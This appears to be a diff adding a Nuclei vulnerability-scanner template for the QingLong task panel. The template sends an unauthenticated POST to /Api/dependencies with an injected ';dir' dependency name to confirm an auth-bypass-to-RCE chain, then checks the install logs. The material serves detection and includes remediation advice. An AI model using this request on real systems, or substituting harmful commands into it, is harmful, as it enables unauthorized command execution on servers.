@@ -1,0 +1,68 @@
+id: qinglong-dependencies-authbypasstorce
+
+info:
+  name: QingLong - Auth Bypass to RCE via Dependencies API (Command Injection)
+  author: qwtd
+  severity: critical
+  description: |
+    QingLong panel is reported to be vulnerable to an authentication bypass (commonly via path case confusion such as /Api/* vs /api/*),
+    allowing unauthenticated access to privileged endpoints. When combined with the Dependencies management API, attackers may inject shell
+    metacharacters in dependency names to achieve remote command execution (RCE), evidenced by install logs such as "开始安装依赖 ...".
+  remediation: |
+    - Upgrade to the vendor-fixed version as soon as available.
+    - As a temporary mitigation, do NOT expose QingLong to the public Internet; restrict access to internal/admin networks only.
+    - Block or strictly control access to /api/* (including case-variants like /Api/*, /aPi/*) at the reverse proxy/WAF layer.
+    - Harden input validation for dependency installation: reject shell metacharacters (; | & ` $() etc.) and enforce allow-lists.
+    - Review audit logs for suspicious dependency install tasks and remove malicious scripts/tasks; rotate exposed credentials if any.
+  impact: |
+    Unauthenticated attackers may execute arbitrary system commands, gain server-level access, install backdoors/miners,
+    tamper with tasks/configurations, and exfiltrate sensitive data.
+  reference:
+    - https://github.com/whyour/qinglong/issues/2934
+    - https://zhuanlan.zhihu.com/p/2012159008597894168
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-863
+  metadata:
+    vendor: whyour
+    product: qinglong
+    verified: false
+    max-request: 2
+  tags: 青龙-定时任务管理面板
+
+flow: |
+  http(1) && wait_for(20) && http(2)
+
+http:
+  - id: auth-bypass
+    raw:
+      - |
+        POST /Api/dependencies HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        [{"name": ";dir","type":0}]
+
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+
+  - id: check-rce-response
+    raw:
+      - |
+        GET /Api/dependencies HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "开始安装依赖 ;dir"
+          - "200"
+        condition: and
+      - type: status
+        status:
+          - 200
